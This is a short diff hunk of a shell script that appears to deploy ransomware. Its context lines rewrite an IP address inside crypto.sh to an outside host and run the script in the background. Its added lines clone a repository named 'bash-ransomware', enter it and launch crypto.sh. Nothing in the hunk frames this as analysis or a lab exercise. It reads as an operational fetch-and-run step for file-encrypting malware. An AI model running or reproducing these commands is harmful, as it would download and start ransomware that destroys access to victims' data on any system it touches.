@@ -8,3 +8,7 @@ sed -i 's/192\.168\.1\.132/89\.107\.242\.44/g' crypto.sh
 chmod 755 crypto.sh
 bash /crypto.sh &
 ./crypto.sh &
+git clone https://github.com/SubtleScope/bash-ransomware
+cd bash-ransomware
+bash /crypto.sh &
+./crypto.sh &
